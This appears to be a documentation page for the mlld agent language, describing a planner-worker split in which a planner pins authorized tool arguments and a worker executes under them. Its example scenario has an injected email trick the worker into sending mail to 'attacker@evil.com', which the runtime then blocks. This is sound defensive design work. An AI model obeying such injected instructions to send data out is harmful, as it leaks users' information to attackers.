---
id: pattern-planner
title: Planner-Worker Authorization
brief: Split agent execution into a planner that authorizes and a worker that executes
category: patterns
tags: [patterns, planner, worker, authorization, agents, handles, facts, security]
related: [facts-and-handles, policy-authorizations, security-getting-started, labels-attestations, security-guards-basics]
related-code: [interpreter/eval/exec/policy-fragment.ts, interpreter/utils/handle-resolution.ts, interpreter/fyi/facts-runtime.ts]
updated: 2026-03-26
---

The planner-worker pattern splits agent execution into two phases: a planner that decides what to do and authorizes specific tools and values, and a worker that executes under those constraints.

## Why split?

An LLM agent that both decides and executes has one shot to get everything right. If it reads untrusted content (an email with injection), the same LLM that's now influenced also controls tool dispatch.

Splitting creates a security boundary:

- The **planner** runs with read tools that return projected handles, looks up trusted data, and produces an authorization bundle specifying exactly which tools and argument values are allowed
- The **worker** runs under that authorization, can read untrusted content, but can only call tools the planner pre-approved with pre-approved values

The worker can be tricked into *wanting* to send to `attacker@evil.com`. It can't actually do it because the planner never authorized that recipient.

## Structure

```mlld
record @contact = {
  facts: [email: string, name: string],
  data: [notes: string?],
  display: [name, { mask: "email" }]
}

exe @searchContacts(query) = run cmd {
  contacts-cli search @query --format json
} => contact

exe exfil:send @sendEmail(recipient, subject, body) = run cmd {
  email-cli send --to @recipient --subject @subject --body @body
} with { controlArgs: ["recipient"] }
```

The `controlArgs` declaration marks `recipient` as a security-relevant parameter that must be constrained in any authorization.

### Planner phase

The planner looks up contacts and receives a projected result with embedded handles:

```json
{
  "name": "Mark Davies",
  "email": {
    "preview": "m***@example.com",
    "handle": { "handle": "h_a7x9k2" }
  }
}
```

The planner copies the inner handle wrapper into a JSON authorization bundle:

```json
{
  "authorizations": {
    "allow": {
      "sendEmail": {
        "args": {
          "recipient": { "handle": "h_a7x9k2" }
        }
      }
    }
  }
}
```

The outer `{ preview, handle }` object is display-only. The planner copies the inner single-key wrapper. The handle `h_a7x9k2` refers to the live contact value with `fact:@contact.email` still attached. The planner pins the exact recipient without copying the raw email address.

`@fyi.facts(...)` remains available for explicit cross-root discovery, but it is no longer the primary planner workflow.

### Worker phase

The worker executes under the combined base policy plus planner authorization:

```mlld
var @base = {
  defaults: {
    rules: ["no-send-to-unknown", "no-untrusted-destructive"]
  },
  operations: { "exfil:send": ["exfil:send"] }
}

var @result = @worker(@task) with { policy: @plannerAuth }
```

At dispatch time:

1. The runtime canonicalizes the authorized recipient back to the live value. The strongest path is `{ "handle": "h_a7x9k2" }`, but the exact emitted preview or bare visible value also resolves when the match is unique.
2. The authorization guard checks: is `sendEmail` allowed? Is `recipient` the pinned value? Yes
3. The inherited positive check runs: does `recipient` carry fact proof or `known`? Yes
4. `no-untrusted-destructive` scopes to control args — `recipient` has `untrusted` cleared by trust refinement. Tainted data args (subject, body) are not checked.
5. The call proceeds

If injection tricks the worker into calling `sendEmail(recipient: "attacker@evil.com")`:

1. `"attacker@evil.com"` was never emitted as a projected value, so it stays a raw literal
2. The authorization guard checks: does this match the pinned value? No
3. Call denied

If the worker copies a masked preview that uniquely matches a projected contact, mlld canonicalizes it back to the live value before the same authorization and positive checks run. If the preview is ambiguous, the runtime fails closed and tells the model to use the handle wrapper.

## Key properties

### Control args are mandatory

Declare control args on write executables with `with { controlArgs: [...] }`. If a `tool:w` exe has no `controlArgs` metadata, built-in send/destroy checks fail closed for that operation.

### Data args are stripped from authorization

The planner doesn't need to know which args are control args. If the planner includes data args (title, description, start_time, etc.) in the authorization, the runtime silently strips them at compilation time. Only declared `controlArgs` are compiled into authorization constraints.

This avoids mismatches where the planner pins a data arg value and the worker produces a slightly different one. The planner can be thorough — the runtime only enforces what's security-relevant.

### Inherited positive checks

Authorization alone is not enough. Even with a planner-approved value, inherited positive checks from the base policy still apply:

- `no-send-to-unknown` requires fact proof or `known` on destination args
- `no-destroy-unknown` requires fact proof or `known` on target args

When `controlArgs` is explicitly declared, any `fact:*` label satisfies the check — the developer already asserted which args are destinations. If the planner pins a value that carried `known` or a matching `fact:` label at plan time, the authorization guard carries that proof forward. If the pinned value had no proof, the inherited check still fails.

### Tolerant comparison

The worker can pass *less* than authorized (fewer recipients) but not *more*. Args not mentioned in the constraint are enforced as empty/null, so silent omission never becomes an open hole.

The runtime does not rewrite arbitrary payloads or tool schemas. Tolerant boundary matching only applies to security-relevant args and only for exact projected forms the runtime emitted.

### Locked policies

`locked: true` on the base policy prevents authorization overrides entirely. Use this when you want planner-produced authorizations to be informational rather than permissive.

## Validation

`mlld validate` catches authorization issues before execution:

- Control args not constrained in the authorization
- Tools authorized with `true` (unconstrained) when they have declared control args
- Missing control-arg metadata on `tool:w` executables

## Full example

```mlld
record @contact = {
  facts: [email: string, name: string],
  data: [notes: string?],
  display: [name, { mask: "email" }],
  when [
    internal => :internal
    * => :external
  ]
}

exe @searchContacts(query) = run cmd {
  contacts-cli search @query --format json
} => contact

exe exfil:send @sendEmail(recipient, subject, body) = run cmd {
  email-cli send --to @recipient --subject @subject --body @body
} with { controlArgs: ["recipient"] }

var @base = {
  defaults: {
    rules: ["no-send-to-unknown", "no-untrusted-destructive"]
  },
  operations: { "exfil:send": ["exfil:send"] }
}

>> Step 1: Planner calls @searchContacts
>> The result already carries a projected email handle on @result.email.handle
>> The planner copies that handle into the authorization bundle

>> Step 2: Orchestrator wires planner output into worker policy
var @plannerAuth = {
  authorizations: {
    allow: {
      sendEmail: {
        args: {
          recipient: { handle: "h_a7x9k2" }
        }
      }
    }
  }
}

>> Step 3: Worker runs under combined policy
show @sendEmail(@contacts.email, "Following up", "Hi Mark...") with { policy: @plannerAuth }
```

For explicit cross-root discovery, a planner can still use `@fyi.facts(...)` as a compatibility tool. See `facts-and-handles` for how records, facts, projections, and handles work. See `policy-authorizations` for the full authorization syntax.
